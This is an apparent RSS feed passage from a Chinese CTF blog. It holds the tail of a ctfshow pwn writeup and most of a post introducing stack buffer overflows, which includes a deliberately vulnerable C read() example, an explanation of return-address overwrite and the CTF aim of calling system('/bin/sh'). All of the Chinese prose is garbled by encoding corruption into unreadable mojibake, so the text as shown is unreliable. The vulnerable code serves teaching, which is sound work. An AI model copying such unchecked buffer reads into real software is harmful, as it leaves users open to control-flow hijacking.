&lt;p&gt;å…¶å®åœ¨è¿é¶æœºè¿›è¡Œäº¤äº’æ—¶ï¼Œæ— è®ºä½ è¾“å…¥ä»€ä¹ˆï¼Œéƒ½æ˜¯æ‹›åŸæ ·ç»™ä½ æ‰“å°å‡ºæ¥çš„ï¼Œä¸»è¦è¿˜æ˜¯çœ‹readã€memsetå‡½æ•°ï¼Œå†µä¸”æ²¡å¼€canaryä¿æŠ¤æœ‰ç«™å¤„ç†æ¼æ´å¯ä»¥åˆ©ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›hackeroutå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/280.png&#34;
	width=&#34;934&#34;
	height=&#34;443&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/280_hu_a80eef9c498fb510.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/280_hu_22dac4a619e0f38b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;210&#34;
		data-flex-basis=&#34;506px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°æœ‰systemå‡½æ•°ï¼Œä¸è¿‡é‡Œè¾¹ä¸æ˜¯binshï¼Œé—®é¢˜ä¸å¤§å¯ä»¥æ„é€ å‡ºæ¥ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹å›ctfshowå‡½æ•°çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œå¯ä»¥å‘ç°så®¹é‡æ˜¯36ï¼Œä½†såˆ°ebpè·ç¦»æœ‰0x28=40ï¼ŒåŠ ä¸Šè¦†ç›–ebpæœ¬èº«çš„4å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰8å­—ç»™åˆ°æˆ‘ä»¬æ”¾ä¸œè¥¿ï¼Œæ— æ³•è¿›è¡Œæˆ‘ä»¬çš„ROPé“¾æ„é€ ï¼Œé‚£ä¹ˆè¿™é‡Œå°±åº”è¯¥è¦æƒ³åˆ°&lt;code&gt;æ ˆè¿ç§»&lt;/code&gt;äº†&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PWN-2</title>
        <link>https://expl0rer.top/p/pwn-2/</link>
        <pubDate>Mon, 25 Aug 2025 00:00:00 +0000</pubDate>
        
        <guid>https://expl0rer.top/p/pwn-2/</guid>
        <description>&lt;img src="https://expl0rer.top/p/pwn-2/PWN2.png" alt="Featured image of post PWN-2" /&gt;&lt;p&gt;&lt;strong&gt;å‰æ–‡ï¼šä»¥ä¸‹æ˜¯æˆ‘å…¥é—¨PWNçš„è®°å½•ï¼Œæ¬¢è¿å„ä½å‰æ¥è§‚çœ‹ï¼Œå°å¼Ÿé¢†æ•™ï¼&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;ç»§ä¸Šä¸€å¤§ç« çš„åŸºç¡€å­¦ ä¹ åï¼Œå¯¹PWNæœ‰äº†ä¸€å®šäº†è§£ï¼ŒçŸ¥é“ä¸€äº›ä¸“åè¯ã€ä¸€äº›ä¿æŠ¤æœºåˆ¶çš„å·¥ä½œæµç¨‹ã€æ±‡ç¼–è¯­è¨€ç­‰ï¼Œæ¥ä¸‹æ¥çš„å‡ ç« å¼€å§‹æ­£å¼å­¦ä¹ äºŒè¿›åˆ¶çš„æ¼æ´åˆ©ç”¨å’ŒåŸç†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;æ ˆæ˜¯PWNæ¯”è¾ƒå¸¸è§çš„çªç ´ç‚¹&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ ˆæº¢å‡ºåŸç†&#34;&gt;æ ˆæº¢å‡ºåŸç†
&lt;/h2&gt;&lt;p&gt;åœ¨ä¸Šä¸€å¤§ç« çš„å‡½æ•°è°ƒç”¨çº¦å®šä¸­ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ï¼š
è°ƒç”¨å‡½æ•°ï¼šåªéœ€è¦å°†ripå‹æ ˆï¼Œå³push ripï¼Œç„¶åè®²ripèµ‹å€¼ä¸ºè¢«è°ƒç”¨å‡½æ•°çš„èµ·å§‹åœ°å€ï¼Œè¿™ä¸€æ“ä½œè¢«éšæ€§çš„å†…ç½®åœ¨callæŒ‡ä»¤ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;è¢«è°ƒç”¨å‡½æ•°ï¼špush rbpï¼› mov rbp rspï¼›sub rsp oxxxã€‚å³ä¿å­˜è°ƒç”¨å‡½æ•°çš„rbpæŒ‡é’ˆï¼Œå°†è‡ªå·±çš„rbpæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç„¶åå¼€è¾Ÿæ ˆç©ºé—´ç»™è‡ªå·±ç”¨,æ­¤æ—¶rbpå°±å˜æˆäº†è¢«è°ƒç”¨å‡½æ•°çš„æ ˆåº•ã€‚&lt;/p&gt;
&lt;p&gt;å‡½æ•°è¿”å›ï¼šleaveï¼›retï¼›ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šmov rsp rbpï¼›pop rbpï¼›pop ripï¼›å³æ¢å¤æ ˆå¸§ï¼Œè¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ ˆçš„ä½œç”¨ä¸ºå­˜å‚¨å‡½æ•°è°ƒç”¨ç›¸å…³ä¿¡æ¯ä»¥åŠå‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¿™äº›å±€éƒ¨å˜é‡é€šå¸¸ä¸ºæ•°ç»„æˆ–è€…è¾“å…¥çš„ç¼“å†²åŒºï¼ˆbufï¼‰ã€‚è€Œå‡½æ•°è°ƒç”¨ç›¸å…³çš„ä¿¡æ¯ï¼Œä¸»è¦æ˜¯è¿”å›åœ°å€å’Œæ ˆåº•æŒ‡é’ˆï¼ˆrbpï¼‰ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ ˆæº¢å‡º&#34;&gt;æ ˆæº¢å‡º
&lt;/h3&gt;&lt;p&gt;å‡½æ•°ä¸­çš„å­˜å‚¨åœ¨æ‰¾ä¸­çš„å±€éƒ¨å˜é‡æ•°ç»„è¾¹ç•Œæ£€æŸ¥ä¸ä¸¥æ ¼å‘ç”Ÿè¶Šç•Œå†™ï¼Œé€ æˆç”¨æˆ·è¾“å…¥è¦†ç›–åˆ°ç¼“å†²åŒºå¤–çš„æ•°æ®å†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºæ ˆä¸­åŒæ—¶å­˜åœ¨ç€ä¸å‡½æ•°è°ƒç”¨å‚æ•°çš„ç›¸å…³ä¿¡æ¯ï¼Œæ ˆæº¢å‡ºå¯ä»¥å¯¼è‡´&lt;strong&gt;æ§åˆ¶æµåŠ«æŒ&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;æ¥è®©æˆ‘è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è‹¥ç”¨æˆ·è¾“å…¥é•¿åº¦è¶…è¿‡æ•°ç»„å®¹é‡ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼š&lt;strong&gt;å‘ä¸Šè¦†ç›–æ ˆä¸­æ›´é«˜åœ°å€çš„æ•°æ®&lt;/strong&gt;ï¼ˆå› ä¸ºæ ˆå‘ä¸‹ç”Ÿé•¿ï¼Œè¶Šç•Œå†™ä¼šå‘é«˜åœ°å€è”“å»¶ï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;å½“è¦†ç›–åˆ° â€œè¿”å›åœ°å€â€ æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å°†å…¶ä¿®æ”¹ä¸º&lt;strong&gt;ä»»æ„åœ°å€&lt;/strong&gt;ï¼ˆå¦‚ shellcode åœ°å€ã€ROP gadget åœ°å€ç­‰ï¼‰ï¼›&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;unistd.h&amp;gt; // åŒ…å«readå‡½æ•°å£°æ˜&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// å­˜åœ¨æ¼æ´çš„å‡½æ•°ï¼šè¯»å–200å­—èŠ‚åˆ°80å­—èŠ‚çš„ç¼“å†²åŒº
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;func_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// å±€éƒ¨å˜é‡ï¼š80å­—èŠ‚çš„æ•°ç»„
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// ä»æ ‡å‡†è¾“å…¥è¯»å–200å­—èŠ‚åˆ°bufï¼ˆæ— é•¿åº¦æ£€æŸ¥ï¼Œå¿…ç„¶æº¢å‡ºï¼‰
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// è°ƒç”¨func_açš„å‡½æ•°
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;func_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;func_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;// è°ƒç”¨æ¼æ´å‡½æ•°
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;// å±€éƒ¨å˜é‡c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;// ç»™cèµ‹å€¼
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// ä¸»å‡½æ•°
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;func_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;// è°ƒç”¨func_b
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;// å±€éƒ¨å˜é‡a
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;// ç»™aèµ‹å€¼
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;mainå‡½æ•°è°ƒç”¨bï¼Œbå‡½æ•°è°ƒç”¨aã€‚ç¼“å†²åŒºæº¢å‡ºå‘ç”Ÿåœ¨aå‡½æ•°ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;bufçš„é•¿åº¦ä¸º80ï¼Œä½†æ˜¯å´è¯»å…¥äº†200é•¿åº¦ã€‚&lt;/em&gt;ï¼ˆæ ˆæº¢å‡ºï¼‰&lt;/p&gt;
&lt;p&gt;åˆ†æç¨‹åºè¿è¡Œè‡³aæ—¶çš„æ ˆå¸§ã€æ ˆä¸­å­˜æ”¾bufå’Œè¿”å›åœ°å€ç­‰ç­‰ä¿¡æ¯ï¼š
&lt;img src=&#34;https://expl0rer.top/p/pwn-2/1.png&#34;
	width=&#34;413&#34;
	height=&#34;840&#34;
	srcset=&#34;https://expl0rer.top/p/pwn-2/1_hu_2535d359c272f0be.png 480w, https://expl0rer.top/p/pwn-2/1_hu_de5df19999eb436.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;bufçš„é•¿åº¦ä¸º80ï¼Œç´§é‚»bå‡½æ•°çš„rbpæŒ‡é’ˆå’Œè¿”å›åœ°å€&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;49&#34;
		data-flex-basis=&#34;118px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¾“å…¥200é•¿åº¦é€ æˆæ ˆæº¢å‡ºï¼Œè¶…å‡ºçš„ 120 å­—èŠ‚ä¼šå‘ä¸Šè¦†ç›–æ ˆä¸­æ›´é«˜åœ°å€çš„å†…å®¹å¦‚retï¼ˆå› ä¸ºæ ˆå‘ä¸‹ç”Ÿé•¿ï¼Œè¶Šç•Œå†™ä¼šå‘é«˜åœ°å€è”“å»¶ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è¦†ç›–è¿”å›åœ°å€å¯ä»¥æ§åˆ¶ç¨‹åºä¸‹ä¸€æ­¥æ‰§è¡Œçš„ä½ç½®ï¼Œè€Œé€šè¿‡æ§åˆ¶æ‰§è¡Œä½ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é—´æ¥å®ç° â€œä¿®æ”¹ä»»æ„åœ°å€â€ çš„æ•ˆæœ&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ä¸¾ä¾‹ï¼Œæ”»å‡»è€…æ„é€ è¾“å…¥ï¼šå‰ 84 å­—èŠ‚å¡«å……æ— å…³æ•°æ®ï¼ˆè¦†ç›–bufå’Œfunc_b()çš„ ebpï¼‰ï¼Œç¬¬ 85~88 å­—èŠ‚å¡«å…¥0x12345678ï¼ˆå°ç«¯åºå¯èƒ½éœ€è¦åå†™ä¸º0x78563412ï¼‰ï¼›è¿™æ—¶è¿”å›åœ°å€è¢«è¦†ç›–æˆ0x12345678ï¼Œç›´æ¥è·³è½¬åˆ°0x12345678ï¼ˆå¯èƒ½æ˜¯æ”»å‡»è€…çš„ä»£ç ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;é‚£è¯´èµ·è¿”å›åœ°å€è¿™ä¸€å—ï¼Œå›å¿†ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è°ƒç”¨å‡½æ•°ï¼šåªéœ€è¦å°†ripå‹æ ˆï¼Œå³push ripï¼Œç„¶åè®²ripèµ‹å€¼ä¸ºè¢«è°ƒç”¨å‡½æ•°çš„èµ·å§‹åœ°å€ï¼Œè¿™ä¸€æ“ä½œè¢«éšæ€§çš„å†…ç½®åœ¨callæŒ‡ä»¤ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;è¢«è°ƒç”¨å‡½æ•°ï¼špush rbpï¼›mov rbp rsp; sub rsp oxxxxã€‚å³ä¿å­˜è°ƒç”¨å‡½æ•°çš„rbpæŒ‡é’ˆï¼Œå°†è‡ªå·±çš„rbpæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç„¶åå¼€è¾Ÿæ ˆç©ºé—´ç»™è‡ªå·±ç”¨ï¼Œæ­¤æ—¶rbpå°±
å˜æˆäº†è¢«è°ƒç”¨å‡½æ•°çš„æ ˆåº•ã€‚&lt;/p&gt;
&lt;p&gt;å‡½æ•°è¿”å›ï¼šleaveï¼›retï¼›ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼šmov rsp rbpï¼›pop rbpï¼›pop ripï¼›å³æ¢å¤æ ˆå¸§ï¼Œè¿”å›è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;æ ˆæº¢å‡ºçš„æ ¸å¿ƒæ˜¯&lt;strong&gt;è¦†ç›–ç¨‹åºä¸­ â€œä¼šè¢«ç”¨æ¥å†³å®šä¸‹ä¸€æ­¥æ‰§è¡Œä½ç½®â€ çš„æ•°æ®&lt;/strong&gt;ï¼Œè¿™äº›æ•°æ®æœªå¿…æ˜¯&lt;code&gt;ret&lt;/code&gt;æŒ‡ä»¤è¯»å–çš„ â€œè¿”å›åœ°å€â€ã€‚å¦‚æœæ ˆä¸­å­˜åœ¨è¢«&lt;code&gt;jmp&lt;/code&gt;ã€&lt;code&gt;call&lt;/code&gt;ç­‰æŒ‡ä»¤ä½¿ç”¨çš„ â€œç›®æ ‡åœ°å€â€ï¼ˆæ¯”å¦‚å‡½æ•°æŒ‡é’ˆã€è·³è½¬è¡¨é¡¹ç­‰ï¼‰ï¼Œè¦†ç›–è¿™äº›åœ°å€åŒæ ·èƒ½å®ç°&lt;strong&gt;æ§åˆ¶æµåŠ«æŒ&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å…·ä½“æ¥è¯´ï¼š&lt;code&gt;ret&lt;/code&gt;ã€&lt;code&gt;jmp&lt;/code&gt;ã€&lt;code&gt;call&lt;/code&gt;çš„å…±æ€§ä¸å·®å¼‚ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;ret&lt;/code&gt;æŒ‡ä»¤&lt;/strong&gt;ï¼šä»æ ˆä¸­è¯»å– â€œè¿”å›åœ°å€â€ å¹¶è·³è½¬ï¼ˆä¾èµ–æ ˆä¸­å­˜å‚¨çš„åœ°å€ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;call åœ°å€&lt;/code&gt;æŒ‡ä»¤&lt;/strong&gt;ï¼šå°†å½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡åœ°å€å‹æ ˆï¼Œç„¶åè·³è½¬åˆ° â€œåœ°å€â€ï¼ˆè‹¥ â€œåœ°å€â€ å­˜å‚¨åœ¨æ ˆä¸­ä¸”å¯è¢«è¦†ç›–ï¼Œåˆ™&lt;code&gt;call&lt;/code&gt;çš„ç›®æ ‡ä¼šè¢«ç¯¡æ”¹ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;jmp åœ°å€&lt;/code&gt;æŒ‡ä»¤&lt;/strong&gt;ï¼šç›´æ¥è·³è½¬åˆ° â€œåœ°å€â€ï¼ˆè‹¥ â€œåœ°å€â€ å­˜å‚¨åœ¨æ ˆä¸­ä¸”å¯è¢«è¦†ç›–ï¼Œåˆ™&lt;code&gt;jmp&lt;/code&gt;çš„ç›®æ ‡ä¼šè¢«ç¯¡æ”¹ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åªè¦è¿™äº›æŒ‡ä»¤ä¾èµ–çš„ â€œç›®æ ‡åœ°å€â€ å­˜å‚¨åœ¨æ ˆä¸­ï¼Œä¸”èƒ½è¢«æ ˆæº¢å‡ºè¦†ç›–ï¼Œå°±èƒ½åŠ«æŒæ§åˆ¶æµã€‚&lt;code&gt;ret&lt;/code&gt;åªæ˜¯æœ€å¸¸è§çš„åœºæ™¯ï¼ˆå› ä¸ºå‡½æ•°è°ƒç”¨çš„è¿”å›åœ°å€å‡ ä¹å¿…ç„¶åœ¨æ ˆä¸Šï¼‰ï¼Œè€Œ&lt;code&gt;jmp&lt;/code&gt;/&lt;code&gt;call&lt;/code&gt;çš„ç›®æ ‡è‹¥åœ¨æ ˆä¸Šï¼ŒåŒæ ·å¯ä»¥è¢«åˆ©ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æ€»ä¹‹ï¼šæ ˆæº¢å‡ºçš„åŸç†å°±æ˜¯æ ˆä¸­å­˜å‚¨çš„å±€éƒ¨å˜é‡æ•°ç»„å‘ç”Ÿæº¢å‡ºï¼Œè¦†ç›–äº†æ ˆä¸­çš„å…¶ä»–æ•°æ®ã€‚å°†è¿”å›åœ°å€è¦†ç›–ä¸ºæˆ‘ä»¬æœŸæœ›çš„ç›®æ ‡åœ°å€ï¼Œå³å¯åŠ«æŒæ§åˆ¶æµã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ ˆæº¢å‡ºåœ¨ctfä¸­çš„åº”ç”¨&#34;&gt;æ ˆæº¢å‡ºåœ¨CTFä¸­çš„åº”ç”¨
&lt;/h3&gt;&lt;p&gt;ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨CTFä¸­çš„PWNï¼Œå¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦è®©ç¨‹åºæ‰§è¡Œè¿™ä¸€æ®µä»£ç ï¼š
&lt;strong&gt;&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´åœ¨è¿œç¨‹æœºå™¨ä¸Šå¼€ä¸€ä¸ªå‘½ä»¤è¡Œç»ˆç«¯ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ¥æ§åˆ¶ç›®æ ‡æœºå™¨ã€‚&lt;/p&gt;
&lt;p&gt;é€šå¸¸æ¥è¯´ï¼ŒCTFæ¯”èµ›ä¸­åªéœ€è¦å¼€å¯å‘½ä»¤è¡Œåè¯»flag(cat flagï¼‰ã€‚&lt;/p&gt;
&lt;h2 id=&#34;åŸºæœ¬æ ˆæº¢å‡º&#34;&gt;åŸºæœ¬æ ˆæº¢å‡º
